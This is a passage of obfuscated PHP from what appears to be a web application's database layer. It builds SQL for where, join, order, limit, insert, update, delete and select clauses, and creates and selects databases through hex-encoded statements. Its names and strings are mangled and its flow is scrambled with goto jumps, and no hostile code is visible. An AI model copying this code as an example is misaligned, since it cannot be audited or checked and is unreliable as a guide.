$this->parseWhereItem($this->parseKey($D¦ÒØ¨ÆŞê), $dä«æÖĞ¸); } } $BÛŒØÌã¨¼ .= $cÙÇŒ¸Ëá[274] . $fÖÒ¡ «Ä÷; } $BÛŒØÌã¨¼ = substr($BÛŒØÌã¨¼, 0, -strlen($fÖÒ¡ «Ä÷)); } return empty($BÛŒØÌã¨¼) ? $cÙÇŒ¸Ëá[33] : $cÙÇŒ¸Ëá[944] . $BÛŒØÌã¨¼; } protected function parseWhereItem($f¤…ƒ›Ëî, $fÚòÖ‘Ë•‡) { $CµŒóßğˆ =& $_SERVER[Š‰]; $AÙ¹¨‘¦ƒ = $CµŒóßğˆ[33]; if (is_array($fÚòÖ‘Ë•‡)) { if (is_string($fÚòÖ‘Ë•‡[0])) { $A…¬†À®¸ö = strtolower($fÚòÖ‘Ë•‡[0]); if (in_array($fÚòÖ‘Ë•‡[0], array($CµŒóßğˆ[928], $CµŒóßğˆ[945], $CµŒóßğˆ[946], $CµŒóßğˆ[947], $CµŒóßğˆ[948], $CµŒóßğˆ[949]))) { $AÙ¹¨‘¦ƒ .= $f¤…ƒ›Ëî . $CµŒóßğˆ[50] . $fÚòÖ‘Ë•‡[0] . $CµŒóßğˆ[50] . $this->parseValue($fÚòÖ‘Ë•‡[1]); } elseif (preg_match($CµŒóßğˆ[950], $fÚòÖ‘Ë•‡[0])) { $AÙ¹¨‘¦ƒ .= $f¤…ƒ›Ëî . $CµŒóßğˆ[50] . $this->exp[$A…¬†À®¸ö] . $CµŒóßğˆ[50] . $this->parseValue($fÚòÖ‘Ë•‡[1]); } elseif (preg_match($CµŒóßğˆ[951], $fÚòÖ‘Ë•‡[0])) { if (is_array($fÚòÖ‘Ë•‡[1])) { $E‰øÂéª‹ä = isset($fÚòÖ‘Ë•‡[2]) ? strtoupper($fÚòÖ‘Ë•‡[2]) : $CµŒóßğˆ[936]; if (in_array($E‰øÂéª‹ä, array($CµŒóßğˆ[935], $CµŒóßğˆ[936], $CµŒóßğˆ[937]))) { $F«äÃàÉÎç = array(); foreach ($fÚòÖ‘Ë•‡[1] as $bìàøÙ‘ÎÂ) { $F«äÃàÉÎç[] = $f¤…ƒ›Ëî . $CµŒóßğˆ[50] . $this->exp[$A…¬†À®¸ö] . $CµŒóßğˆ[50] . $this->parseValue($bìàøÙ‘ÎÂ); } $AÙ¹¨‘¦ƒ .= $CµŒóßğˆ[256] . implode($CµŒóßğˆ[50] . $E‰øÂéª‹ä . $CµŒóßğˆ[50], $F«äÃàÉÎç) . $CµŒóßğˆ[842]; } } else { $AÙ¹¨‘¦ƒ .= $f¤…ƒ›Ëî . $CµŒóßğˆ[50] . $this->exp[$A…¬†À®¸ö] . $CµŒóßğˆ[50] . $this->parseValue($fÚòÖ‘Ë•‡[1]); } } elseif ($CµŒóßğˆ[293] == $A…¬†À®¸ö) { $AÙ¹¨‘¦ƒ .= $CµŒóßğˆ[840] . $f¤…ƒ›Ëî . $CµŒóßğˆ[50] . $fÚòÖ‘Ë•‡[1] . $CµŒóßğˆ[952]; } elseif (preg_match($CµŒóßğˆ[953], $fÚòÖ‘Ë•‡[0])) { $AÙ¹¨‘¦ƒ .= $fÚòÖ‘Ë•‡[0]; } elseif (preg_match($CµŒóßğˆ[954], $fÚòÖ‘Ë•‡[0])) { if (isset($fÚòÖ‘Ë•‡[2]) && $CµŒóßğˆ[293] == $fÚòÖ‘Ë•‡[2]) { $AÙ¹¨‘¦ƒ .= $f¤…ƒ›Ëî . $CµŒóßğˆ[50] . $this->exp[$A…¬†À®¸ö] . $CµŒóßğˆ[50] . $fÚòÖ‘Ë•‡[1]; } else { if (is_string($fÚòÖ‘Ë•‡[1])) { $fÚòÖ‘Ë•‡[1] = explode($CµŒóßğˆ[47], $fÚòÖ‘Ë•‡[1]); } $CÆÆÛ™’„ = implode($CµŒóßğˆ[47], $this->parseValue($fÚòÖ‘Ë•‡[1])); $AÙ¹¨‘¦ƒ .= $f¤…ƒ›Ëî . $CµŒóßğˆ[50] . $this->exp[$A…¬†À®¸ö] . $CµŒóßğˆ[840] . $CÆÆÛ™’„ . $CµŒóßğˆ[842]; } } elseif (preg_match($CµŒóßğˆ[955], $fÚòÖ‘Ë•‡[0])) { $CÙ›¯œ„˜Ë = is_string($fÚòÖ‘Ë•‡[1]) ? explode($CµŒóßğˆ[47], $fÚòÖ‘Ë•‡[1]) : $fÚòÖ‘Ë•‡[1]; $AÙ¹¨‘¦ƒ .= $CµŒóßğˆ[840] . $f¤…ƒ›Ëî . $CµŒóßğˆ[50] . $this->exp[$A…¬†À®¸ö] . $CµŒóßğˆ[50] . $this->parseValue($CÙ›¯œ„˜Ë[0]) . $CµŒóßğˆ[938] . $this->parseValue($CÙ›¯œ„˜Ë[1]) . $CµŒóßğˆ[274]; } else { think_exception(think_lang($CµŒóßğˆ[941]) . $CµŒóßğˆ[4] . $fÚòÖ‘Ë•‡[0]); } } else { $BÎôË—¨ÃË = count($fÚòÖ‘Ë•‡); $dÑ÷ŠØ¤À• = $CµŒóßğˆ[33]; if (is_string($fÚòÖ‘Ë•‡[$BÎôË—¨ÃË - 1])) { $dÑ÷ŠØ¤À• = isset($fÚòÖ‘Ë•‡[$BÎôË—¨ÃË - 1]) ? strtoupper($fÚòÖ‘Ë•‡[$BÎôË—¨ÃË - 1]) : $CµŒóßğˆ[33]; if (in_array($dÑ÷ŠØ¤À•, array($CµŒóßğˆ[935], $CµŒóßğˆ[936], $CµŒóßğˆ[937]))) { $BÎôË—¨ÃË = $BÎôË—¨ÃË - 1; } } else { $dÑ÷ŠØ¤À• = $CµŒóßğˆ[935]; } for ($E±š·ëÍÔá = 0; $E±š·ëÍÔá < $BÎôË—¨ÃË; $E±š·ëÍÔá++) { $CÙ›¯œ„˜Ë = is_array($fÚòÖ‘Ë•‡[$E±š·ëÍÔá]) ? $fÚòÖ‘Ë•‡[$E±š·ëÍÔá][1] : $fÚòÖ‘Ë•‡[$E±š·ëÍÔá]; if ($CµŒóßğˆ[293] == strtolower($fÚòÖ‘Ë•‡[$E±š·ëÍÔá][0])) { $AÙ¹¨‘¦ƒ .= $CµŒóßğˆ[256] . $f¤…ƒ›Ëî . $CµŒóßğˆ[50] . $CÙ›¯œ„˜Ë . $CµŒóßğˆ[952] . $dÑ÷ŠØ¤À• . $CµŒóßğˆ[50]; } else { $F¸§öóÔ¹ç = is_array($fÚòÖ‘Ë•‡[$E±š·ëÍÔá]) ? $this->exp[strtolower($fÚòÖ‘Ë•‡[$E±š·ëÍÔá][0])] : $CµŒóßğˆ[928]; if (!$F¸§öóÔ¹ç && is_array($fÚòÖ‘Ë•‡[$E±š·ëÍÔá]) && in_array($fÚòÖ‘Ë•‡[$E±š·ëÍÔá][0], array($CµŒóßğˆ[928], $CµŒóßğˆ[945], $CµŒóßğˆ[946], $CµŒóßğˆ[947], $CµŒóßğˆ[948], $CµŒóßğˆ[949]))) { $F¸§öóÔ¹ç = $fÚòÖ‘Ë•‡[$E±š·ëÍÔá][0]; } $AÙ¹¨‘¦ƒ .= $CµŒóßğˆ[256] . $f¤…ƒ›Ëî . $CµŒóßğˆ[50] . $F¸§öóÔ¹ç . $CµŒóßğˆ[50] . $this->parseValue($CÙ›¯œ„˜Ë) . $CµŒóßğˆ[952] . $dÑ÷ŠØ¤À• . $CµŒóßğˆ[50]; } } $AÙ¹¨‘¦ƒ = substr($AÙ¹¨‘¦ƒ, 0, -4); } } else { $AÙ¹¨‘¦ƒ .= $f¤…ƒ›Ëî . $CµŒóßğˆ[956] . $this->parseValue($fÚòÖ‘Ë•‡); } return $AÙ¹¨‘¦ƒ; } protected function parseThinkWhere($e‡‘Š—ù‚, $AŒŠğ¢›ôì) { $c¦©ì²Şë =& $_SERVER[Š‰]; $dÀÃØ–ˆ£ã = $c¦©ì²Şë[33]; switch ($e‡‘Š—ù‚) { case $c¦©ì²Şë[348]: $dÀÃØ–ˆ£ã = $AŒŠğ¢›ôì; break; case $c¦©ì²Şë[939]: $dÀÃØ–ˆ£ã = is_string($AŒŠğ¢›ôì) ? $AŒŠğ¢›ôì : substr($this->parseWhere($AŒŠğ¢›ôì), 6); break; case $c¦©ì²Şë[957]: parse_str($AŒŠğ¢›ôì, $bŸì†à…ÎÜ); if (isset($bŸì†à…ÎÜ[$c¦©ì²Şë[934]])) { $A†Û¡¡éè = $c¦©ì²Şë[50] . strtoupper($bŸì†à…ÎÜ[$c¦©ì²Şë[934]]) . $c¦©ì²Şë[50]; unset($bŸì†à…ÎÜ[$c¦©ì²Şë[934]]); } else { $A†Û¡¡éè = $c¦©ì²Şë[938]; } $f¼Ùˆ×·ÌÑ = array(); foreach ($bŸì†à…ÎÜ as $DàÂ¨µ”¯ => $e¬ÂÑÜ‰ù) { $f¼Ùˆ×·ÌÑ[] = $this->parseKey($DàÂ¨µ”¯) . $c¦©ì²Şë[956] . $this->parseValue($e¬ÂÑÜ‰ù); } $dÀÃØ–ˆ£ã = implode($A†Û¡¡éè, $f¼Ùˆ×·ÌÑ); break; } return $dÀÃØ–ˆ£ã; } protected function parseLimit($Fì†Ñ–ÎÅ) { $dµ‘ëÀš¬í =& $_SERVER[Š‰]; return !empty($Fì†Ñ–ÎÅ) ? $dµ‘ëÀš¬í[48] . $Fì†Ñ–ÎÅ . $dµ‘ëÀš¬í[50] : $dµ‘ëÀš¬í[33]; } protected function parseJoin($Cèª÷Ò†¿À) { $AÆôŸë“ =& $_SERVER[Š‰]; $d†³ãÏ¦‡“ = $AÆôŸë“[33]; if (!empty($Cèª÷Ò†¿À)) { if (is_array($Cèª÷Ò†¿À)) { foreach ($Cèª÷Ò†¿À as $Fºš÷•Î‰ => $eÚ¹Ö˜Âø) { if (!1 !== stripos($eÚ¹Ö˜Âø, $AÆôŸë“[958])) { $d†³ãÏ¦‡“ .= $AÆôŸë“[50] . $eÚ¹Ö˜Âø; } else { $d†³ãÏ¦‡“ .= $AÆôŸë“[959] . $eÚ¹Ö˜Âø; } } } else { $d†³ãÏ¦‡“ .= $AÆôŸë“[959] . $Cèª÷Ò†¿À; } } $d†³ãÏ¦‡“ = preg_replace($AÆôŸë“[960], think_config($AÆôŸë“[866]) . $AÆôŸë“[961], $d†³ãÏ¦‡“); return $d†³ãÏ¦‡“; } protected function parseOrder($E£ÍÆ÷ÑË×) { $b›ŒÂŠåÌ— =& $_SERVER[Š‰]; if (is_array($E£ÍÆ÷ÑË×)) { $aÂÉ‰Ä‡› = array(); foreach ($E£ÍÆ÷ÑË× as $Dè®‹±ùÑ¸ => $FğÅ²ç—Õ¿) { if (is_numeric($Dè®‹±ùÑ¸)) { $aÂÉ‰Ä‡›[] = $this->parseKey($FğÅ²ç—Õ¿); } else { $FğÅ²ç—Õ¿ = in_array(strtoupper(trim($FğÅ²ç—Õ¿)), array($b›ŒÂŠåÌ—[962], $b›ŒÂŠåÌ—[963])) ? $b›ŒÂŠåÌ—[50] . $FğÅ²ç—Õ¿ : $b›ŒÂŠåÌ—[33]; if (preg_match($b›ŒÂŠåÌ—[964], $Dè®‹±ùÑ¸)) { $aÂÉ‰Ä‡›[] = $this->parseKey($Dè®‹±ùÑ¸) . $FğÅ²ç—Õ¿; } else { think_exception($b›ŒÂŠåÌ—[965] . $Dè®‹±ùÑ¸); } } } $E£ÍÆ÷ÑË× = implode($b›ŒÂŠåÌ—[47], $aÂÉ‰Ä‡›); } return !empty($E£ÍÆ÷ÑË×) ? $b›ŒÂŠåÌ—[966] . $E£ÍÆ÷ÑË× : $b›ŒÂŠåÌ—[33]; } protected function parseGroup($A–Íîß†è) { $AÛ¨„Şš»ñ =& $_SERVER[Š‰]; return !empty($A–Íîß†è) ? $AÛ¨„Şš»ñ[967] . $A–Íîß†è : $AÛ¨„Şš»ñ[33]; } protected function parseHaving($F°“°ËÈì³) { $dãÊèƒ©¡ =& $_SERVER[Š‰]; return !empty($F°“°ËÈì³) ? $dãÊèƒ©¡[968] . $F°“°ËÈì³ : $dãÊèƒ©¡[33]; } protected function parseComment($AÔÌªß˜ô‚) { $dğùáÔÅŸ =& $_SERVER[Š‰]; return !empty($AÔÌªß˜ô‚) ? $dğùáÔÅŸ[969] . $AÔÌªß˜ô‚ . $dğùáÔÅŸ[970] : $dğùáÔÅŸ[33]; } protected function parseDistinct($eñÅ¦œÖÀé) { $E•æ–¿‡âê =& $_SERVER[Š‰]; return !empty($eñÅ¦œÖÀé) ? $E•æ–¿‡âê[971] : $E•æ–¿‡âê[33]; } protected function parseUnion($E²ÎÍÎ”öâ) { $d°·£«Ü·É =& $_SERVER[Š‰]; if (empty($E²ÎÍÎ”öâ)) { return $d°·£«Ü·É[33]; } if (isset($E²ÎÍÎ”öâ[$d°·£«Ü·É[344]])) { $BÒØš¢õÎµ = $d°·£«Ü·É[972]; unset($E²ÎÍÎ”öâ[$d°·£«Ü·É[344]]); } else { $BÒØš¢õÎµ = $d°·£«Ü·É[973]; } foreach ($E²ÎÍÎ”öâ as $fÕ•Ú†‘‹Ú) { $fêìİóšò[] = $BÒØš¢õÎµ . (is_array($fÕ•Ú†‘‹Ú) ? $this->buildSelectSql($fÕ•Ú†‘‹Ú) : $fÕ•Ú†‘‹Ú); } return implode($d°·£«Ü·É[50], $fêìİóšò); } public function insert($EÅÑ“ÍˆÂÀ, $báìÔ×ˆ¬– = array(), $aç™ÒïÌˆß = false) { goto FÔÏªßŞÏ; A‚³ë… Šº: $eµæé¿Ï©½ .= $this->parseComment(!empty($báìÔ×ˆ¬–[$aêˆ©¢îç[350]]) ? $báìÔ×ˆ¬–[$aêˆ©¢îç[350]] : $aêˆ©¢îç[33]); return $this->execute($eµæé¿Ï©½, $this->parseBind(!empty($báìÔ×ˆ¬–[$aêˆ©¢îç[281]]) ? $báìÔ×ˆ¬–[$aêˆ©¢îç[281]] : array())); goto c¸¯Ùò¥‹Û; c²¨§á¨Ìƒ: foreach ($EÅÑ“ÍˆÂÀ as $E«ÜºÚ·¦• => $bœŠÉ¦Ô±) { if (is_array($bœŠÉ¦Ô±) && $aêˆ©¢îç[293] == $bœŠÉ¦Ô±[0]) { $aµ’°ÒÒº[] = $this->parseKey($E«ÜºÚ·¦•); $eÓ¶³éŠù®[] = $bœŠÉ¦Ô±[1]; } elseif (is_scalar($bœŠÉ¦Ô±) || is_null($bœŠÉ¦Ô±)) { $aµ’°ÒÒº[] = $this->parseKey($E«ÜºÚ·¦•); $eÓ¶³éŠù®[] = $this->parseValue($bœŠÉ¦Ô±); } } $eµæé¿Ï©½ = ($aç™ÒïÌˆß ? $aêˆ©¢îç[844] : $aêˆ©¢îç[845]) . $aêˆ©¢îç[846] . $this->parseTable($báìÔ×ˆ¬–[$aêˆ©¢îç[275]]) . $aêˆ©¢îç[840] . implode($aêˆ©¢îç[47], $aµ’°ÒÒº) . $aêˆ©¢îç[841] . implode($aêˆ©¢îç[47], $eÓ¶³éŠù®) . $aêˆ©¢îç[842]; $eµæé¿Ï©½ .= $this->parseLock(isset($báìÔ×ˆ¬–[$aêˆ©¢îç[797]]) ? $báìÔ×ˆ¬–[$aêˆ©¢îç[797]] : !1); goto A‚³ë… Šº; FÔÏªßŞÏ: $aêˆ©¢îç =& $_SERVER[Š‰]; $eÓ¶³éŠù® = $aµ’°ÒÒº = array(); $this->model = $báìÔ×ˆ¬–[$aêˆ©¢îç[277]]; goto c²¨§á¨Ìƒ; c¸¯Ùò¥‹Û: } public function selectInsert($aç¥œÉÈé°, $AæõÃØ–à´, $cÉ©õ¢—¢í = array()) { goto e´§è†„‚; e´§è†„‚: $cß†¼’ãµ =& $_SERVER[Š‰]; $this->model = $cÉ©õ¢—¢í[$cß†¼’ãµ[277]]; if (is_string($aç¥œÉÈé°)) { $aç¥œÉÈé° = explode($cß†¼’ãµ[47], $aç¥œÉÈé°); } goto DíÇ’ì­ÛÖ; F’ù…š¨÷Ã: return $this->execute($f„õèÏ, $this->parseBind(!empty($cÉ©õ¢—¢í[$cß†¼’ãµ[281]]) ? $cÉ©õ¢—¢í[$cß†¼’ãµ[281]] : array())); goto B”êÒæ¹ÏÅ; DíÇ’ì­ÛÖ: array_walk($aç¥œÉÈé°, array($this, $cß†¼’ãµ[843])); $f„õèÏ = $cß†¼’ãµ[974] . $this->parseTable($AæõÃØ–à´) . $cß†¼’ãµ[840] . implode($cß†¼’ãµ[47], $aç¥œÉÈé°) . $cß†¼’ãµ[952]; $f„õèÏ .= $this->buildSelectSql($cÉ©õ¢—¢í); goto F’ù…š¨÷Ã; B”êÒæ¹ÏÅ: } public function update($f–‘Óß‚Ü, $B†®´œÄæ¦) { $e‚¿©‚ó¿Ö =& $_SERVER[Š‰]; $this->model = $B†®´œÄæ¦[$e‚¿©‚ó¿Ö[277]]; $Fõ›Äóì‘ = $e‚¿©‚ó¿Ö[975] . $this->parseTable($B†®´œÄæ¦[$e‚¿©‚ó¿Ö[275]]) . $this->parseSet($f–‘Óß‚Ü) . $this->parseWhere(!empty($B†®´œÄæ¦[$e‚¿©‚ó¿Ö[271]]) ? $B†®´œÄæ¦[$e‚¿©‚ó¿Ö[271]] : $e‚¿©‚ó¿Ö[33]) . $this->parseOrder(!empty($B†®´œÄæ¦[$e‚¿©‚ó¿Ö[361]]) ? $B†®´œÄæ¦[$e‚¿©‚ó¿Ö[361]] : $e‚¿©‚ó¿Ö[33]) . $this->parseLimit(!empty($B†®´œÄæ¦[$e‚¿©‚ó¿Ö[288]]) ? $B†®´œÄæ¦[$e‚¿©‚ó¿Ö[288]] : $e‚¿©‚ó¿Ö[33]) . $this->parseLock(isset($B†®´œÄæ¦[$e‚¿©‚ó¿Ö[797]]) ? $B†®´œÄæ¦[$e‚¿©‚ó¿Ö[797]] : !1) . $this->parseComment(!empty($B†®´œÄæ¦[$e‚¿©‚ó¿Ö[350]]) ? $B†®´œÄæ¦[$e‚¿©‚ó¿Ö[350]] : $e‚¿©‚ó¿Ö[33]); return $this->execute($Fõ›Äóì‘, $this->parseBind(!empty($B†®´œÄæ¦[$e‚¿©‚ó¿Ö[281]]) ? $B†®´œÄæ¦[$e‚¿©‚ó¿Ö[281]] : array())); } public function delete($E½ö«Ï…À = array()) { $d™½££…‘˜ =& $_SERVER[Š‰]; $this->model = $E½ö«Ï…À[$d™½££…‘˜[277]]; $cÕÁˆÔ“¬  = $d™½££…‘˜[976] . $this->parseTable($E½ö«Ï…À[$d™½££…‘˜[275]]) . $this->parseWhere(!empty($E½ö«Ï…À[$d™½££…‘˜[271]]) ? $E½ö«Ï…À[$d™½££…‘˜[271]] : $d™½££…‘˜[33]) . $this->parseOrder(!empty($E½ö«Ï…À[$d™½££…‘˜[361]]) ? $E½ö«Ï…À[$d™½££…‘˜[361]] : $d™½££…‘˜[33]) . $this->parseLimit(!empty($E½ö«Ï…À[$d™½££…‘˜[288]]) ? $E½ö«Ï…À[$d™½££…‘˜[288]] : $d™½££…‘˜[33]) . $this->parseLock(isset($E½ö«Ï…À[$d™½££…‘˜[797]]) ? $E½ö«Ï…À[$d™½££…‘˜[797]] : !1) . $this->parseComment(!empty($E½ö«Ï…À[$d™½££…‘˜[350]]) ? $E½ö«Ï…À[$d™½££…‘˜[350]] : $d™½££…‘˜[33]); return $this->execute($cÕÁˆÔ“¬ , $this->parseBind(!empty($E½ö«Ï…À[$d™½££…‘˜[281]]) ? $E½ö«Ï…À[$d™½££…‘˜[281]] : array())); } public function select($f´ƒºªÏ = array()) { goto d‘äÔÃæÒó; e“¤ÎÕ»«ó: $B‹‡¼Æ´ = isset($f´ƒºªÏ[$d„½ƒçÂ´[345]]) ? $f´ƒºªÏ[$d„½ƒçÂ´[345]] : !1; if ($B‹‡¼Æ´) { $eí‘› ¤¤Ï = is_string($B‹‡¼Æ´[$d„½ƒçÂ´[92]]) ? $B‹‡¼Æ´[$d„½ƒçÂ´[92]] : $d„½ƒçÂ´[977] . md5($c…Ê¡‘åÀø); $E×ßŒÚ†¿‡ = think_cache($eí‘› ¤¤Ï, $d„½ƒçÂ´[33], $B‹‡¼Æ´); if (!1 !== $E×ßŒÚ†¿‡) { return $E×ßŒÚ†¿‡; } } $b¥ä¦Íëó¦ = $this->query($c…Ê¡‘åÀø, $this->parseBind(!empty($f´ƒºªÏ[$d„½ƒçÂ´[281]]) ? $f´ƒºªÏ[$d„½ƒçÂ´[281]] : array())); goto bßÁÇ¤Ò—; bßÁÇ¤Ò—: if ($B‹‡¼Æ´ && !1 !== $b¥ä¦Íëó¦) { think_cache($eí‘› ¤¤Ï, $b¥ä¦Íëó¦, $B‹‡¼Æ´); } return $b¥ä¦Íëó¦; goto F¨ˆÒÌÓçÂ; d‘äÔÃæÒó: $d„½ƒçÂ´ =& $_SERVER[Š‰]; $this->model = $f´ƒºªÏ[$d„½ƒçÂ´[277]]; $c…Ê¡‘åÀø = $this->buildSelectSql($f´ƒºªÏ); goto e“¤ÎÕ»«ó; F¨ˆÒÌÓçÂ: } public function buildSelectSql($F—ŒŸ²ÒÜÚ = array()) { goto B’ğØó‹ö–; e·öÉ‡ìğ´: $FÍ÷…Õ‚Ş = $this->parseSql($this->selectSql, $F—ŒŸ²ÒÜÚ); $FÍ÷…Õ‚Ş .= $this->parseLock(isset($F—ŒŸ²ÒÜÚ[$C†°™¡ì[797]]) ? $F—ŒŸ²ÒÜÚ[$C†°™¡ì[797]] : !1); if (isset($eÃµ–ÍÕ’›)) { think_cache($eÃµ–ÍÕ’›, $FÍ÷…Õ‚Ş); } goto C¸ŒÑŠ‹­õ; C¸ŒÑŠ‹­õ: return $FÍ÷…Õ‚Ş; goto dÊ¼Âè¦šŒ; B’ğØó‹ö–: $C†°™¡ì =& $_SERVER[Š‰]; if (isset($F—ŒŸ²ÒÜÚ[$C†°™¡ì[349]])) { if (strpos($F—ŒŸ²ÒÜÚ[$C†°™¡ì[349]], $C†°™¡ì[47])) { list($cİªÆ›ºšÂ, $a…ÌÏáÎ¨) = explode($C†°™¡ì[47], $F—ŒŸ²ÒÜÚ[$C†°™¡ì[349]]); } else { $cİªÆ›ºšÂ = $F—ŒŸ²ÒÜÚ[$C†°™¡ì[349]]; } $cİªÆ›ºšÂ = $cİªÆ›ºšÂ ? $cİªÆ›ºšÂ : 1; $a…ÌÏáÎ¨ = isset($a…ÌÏáÎ¨) ? $a…ÌÏáÎ¨ : (is_numeric($F—ŒŸ²ÒÜÚ[$C†°™¡ì[288]]) ? $F—ŒŸ²ÒÜÚ[$C†°™¡ì[288]] : 20); $b¢¯š©×à = $a…ÌÏáÎ¨ * ((int) $cİªÆ›ºšÂ - 1); $F—ŒŸ²ÒÜÚ[$C†°™¡ì[288]] = $b¢¯š©×à . $C†°™¡ì[47] . $a…ÌÏáÎ¨; } if (think_config($C†°™¡ì[978])) { $eÃµ–ÍÕ’› = $C†°™¡ì[979] . md5(serialize($F—ŒŸ²ÒÜÚ)); $DÃ¡ÒÙªÀ = think_cache($eÃµ–ÍÕ’›); if ($DÃ¡ÒÙªÀ) { return $DÃ¡ÒÙªÀ; } } goto e·öÉ‡ìğ´; dÊ¼Âè¦šŒ: } public function parseSql($e¢Ô©Õ¥Ù, $Eõ¾®ß‚–ä = array()) { $dã–µİƒÇ =& $_SERVER[Š‰]; $e¢Ô©Õ¥Ù = str_replace(array($dã–µİƒÇ[980], $dã–µİƒÇ[981], $dã–µİƒÇ[982], $dã–µİƒÇ[983], $dã–µİƒÇ[984], $dã–µİƒÇ[985], $dã–µİƒÇ[986], $dã–µİƒÇ[987], $dã–µİƒÇ[988], $dã–µİƒÇ[989], $dã–µİƒÇ[990]), array($this->parseTable("{$Eõ¾®ß‚–ä[$dã–µİƒÇ[275]]}"), $this->parseDistinct(isset($Eõ¾®ß‚–ä[$dã–µİƒÇ[991]]) ? $Eõ¾®ß‚–ä[$dã–µİƒÇ[991]] : !1), $this->parseField(!empty($Eõ¾®ß‚–ä[$dã–µİƒÇ[269]]) ? $Eõ¾®ß‚–ä[$dã–µİƒÇ[269]] : $dã–µİƒÇ[182]), $this->parseJoin(!empty($Eõ¾®ß‚–ä[$dã–µİƒÇ[278]]) ? $Eõ¾®ß‚–ä[$dã–µİƒÇ[278]] : $dã–µİƒÇ[33]), $this->parseWhere(!empty($Eõ¾®ß‚–ä[$dã–µİƒÇ[271]]) ? $Eõ¾®ß‚–ä[$dã–µİƒÇ[271]] : $dã–µİƒÇ[33]), $this->parseGroup(!empty($Eõ¾®ß‚–ä[$dã–µİƒÇ[992]]) ? $Eõ¾®ß‚–ä[$dã–µİƒÇ[992]] : $dã–µİƒÇ[33]), $this->parseHaving(!empty($Eõ¾®ß‚–ä[$dã–µİƒÇ[993]]) ? $Eõ¾®ß‚–ä[$dã–µİƒÇ[993]] : $dã–µİƒÇ[33]), $this->parseOrder(!empty($Eõ¾®ß‚–ä[$dã–µİƒÇ[361]]) ? $Eõ¾®ß‚–ä[$dã–µİƒÇ[361]] : $dã–µİƒÇ[33]), $this->parseLimit(!empty($Eõ¾®ß‚–ä[$dã–µİƒÇ[288]]) ? $Eõ¾®ß‚–ä[$dã–µİƒÇ[288]] : $dã–µİƒÇ[33]), $this->parseUnion(!empty($Eõ¾®ß‚–ä[$dã–µİƒÇ[343]]) ? $Eõ¾®ß‚–ä[$dã–µİƒÇ[343]] : $dã–µİƒÇ[33]), $this->parseComment(!empty($Eõ¾®ß‚–ä[$dã–µİƒÇ[350]]) ? $Eõ¾®ß‚–ä[$dã–µİƒÇ[350]] : $dã–µİƒÇ[33])), $e¢Ô©Õ¥Ù); return $e¢Ô©Õ¥Ù; } public function getLastSql($a†ğ­ÏÎÔ£ = '') { return $a†ğ­ÏÎÔ£ ? $this->modelSql[$a†ğ­ÏÎÔ£] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($c†…‹ØÉÇ) { return addslashes($c†…‹ØÉÇ); } public function setModel($eÇ­¬–ò) { $this->model = $eÇ­¬–ò; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($B¡•³Õàµ, $DÙïôœ¾± = '') { $this->database = $B¡•³Õàµ; $this->type = $DÙïôœ¾±; } public function model($e”§²´§…˜ = '') { return new ModelBase($e”§²´§…˜, $_SERVER[Š‰][33], $this->database); } public function db($F–ìµ™ášã = false) { goto Dæ£ ŒŞ¤Ê; B¢Øà‘ÖÙÁ: $FÉš‚“Ù = $B–¹¤±ÖÅ±[$E¬ŸøéŠ¨Ÿ[906]]; $B–¹¤±ÖÅ±[$E¬ŸøéŠ¨Ÿ[906]] = $E¬ŸøéŠ¨Ÿ[33]; if ($B–¹¤±ÖÅ±[$E¬ŸøéŠ¨Ÿ[737]] == $E¬ŸøéŠ¨Ÿ[738]) { $BÒ‚öª¨¿Â = $B–¹¤±ÖÅ±[$E¬ŸøéŠ¨Ÿ[739]]; $B–¹¤±ÖÅ±[$E¬ŸøéŠ¨Ÿ[739]] = substr($BÒ‚öª¨¿Â, 0, strrpos($BÒ‚öª¨¿Â, $E¬ŸøéŠ¨Ÿ[994])); } goto CÃ¢£óŠ¯; AŒŠ¨·Óè‚: if (!$f‹¡Ç‡®÷•) { $BµÓÒ­Ò‰Ğ->execute("\143\x72\145\x61\164\x65\40\x64\x61\x74\141\142\x61\x73\x65\40\140{$FÉš‚“Ù}\x60"); } $B–¹¤±ÖÅ±[$E¬ŸøéŠ¨Ÿ[906]] = $FÉš‚“Ù; if ($B–¹¤±ÖÅ±[$E¬ŸøéŠ¨Ÿ[737]] == $E¬ŸøéŠ¨Ÿ[738]) { $B–¹¤±ÖÅ±[$E¬ŸøéŠ¨Ÿ[739]] .= $E¬ŸøéŠ¨Ÿ[994] . $FÉš‚“Ù; } goto e‡¶–‡Šê; Dæ£ ŒŞ¤Ê: $E¬ŸøéŠ¨Ÿ =& $_SERVER[Š‰]; $B–¹¤±ÖÅ± = array_change_key_case($this->database); if ($this->type == $E¬ŸøéŠ¨Ÿ[9] || !$F–ìµ™ášã) { return $this->model()->db(); } goto B¢Øà‘ÖÙÁ; e‡¶–‡Šê: $this->database = $B–¹¤±ÖÅ±; $BµÓÒ­Ò‰Ğ->execute("\x75\x73\x65\x20\x60{$FÉš‚“Ù}\x60"); return $BµÓÒ­Ò‰Ğ; goto E˜“»ÄÍâˆ; CÃ¢£óŠ¯: $this->database = $B–¹¤±ÖÅ±; $BµÓÒ­Ò‰Ğ = $this->model()->db(); try { $f‹¡Ç‡®÷• = $BµÓÒ­Ò‰Ğ->execute("\x73\150\x6f\167\x20\144\141\x74\x61\x62\141\163\145\163\x20\154\151\x6b\145\x20\x27{$FÉš‚“Ù}\47"); } catch (Exception $Cœ°¶‰³) { } goto AŒŠ¨·Óè‚; E˜“»ÄÍâˆ: } public function createTable($d¼óŞ‘íÃ‚, $D¨º…›ù = null) { $A·¬ßÕ£æÁ =& $_SERVER[Š‰]; if (!IO::exist($d¼óŞ‘íÃ‚)) { ActionCall($A·¬ßÕ£æÁ[995], !0, 0); show_json(LNG($A·¬ßÕ£æÁ[996]), !1); } $c°¼‚§¹ = sqlSplit(IO::getContent($d¼óŞ‘íÃ‚)); foreach ($c°¼‚§¹ as $Fğ…ÆíÏò‹) { if ($D¨º…›ù) { $d¬àİ‹æÏ = stripos($Fğ…ÆíÏò‹, $A·¬ßÕ£æÁ[997]) === 0; if ($d¬àİ‹æÏ) { $D¨º…›ù->task[$A·¬ßÕ£æÁ[998]] += 1; } } $this->model()->db()->execute($Fğ…ÆíÏò‹); if ($D¨º…›ù && $d¬àİ‹æÏ) { preg_match($A·¬ßÕ£æÁ[999], $Fğ…ÆíÏò‹, $E¨óÉÇŒ); $D¨º…›ù->task[$A·¬ßÕ£æÁ[1000]] = $E¨óÉÇŒ[1]; $D¨º…›ù->update(1); } } 